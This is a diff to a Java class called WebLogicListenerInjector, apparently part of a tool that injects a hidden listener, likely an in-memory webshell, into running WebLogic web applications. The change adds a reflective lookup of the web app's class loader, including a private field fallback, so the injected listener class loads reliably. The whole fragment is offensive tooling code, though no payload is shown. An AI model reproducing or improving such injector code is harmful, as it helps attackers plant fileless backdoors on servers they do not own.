@@ -140,13 +140,18 @@ public class WebLogicListenerInjector {
         return webappContexts.toArray();
     }
 
-    private Object getListener(Object context) {
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return (ClassLoader) invokeMethod(context, "getClassLoader", null, null);
+        } catch (Exception ignored) {
+            return (ClassLoader) getFieldValue(context, "classLoader");
+        }
+    }
+
+    private Object getListener(Object context) throws Exception {
 
         Object listener = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             listener = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
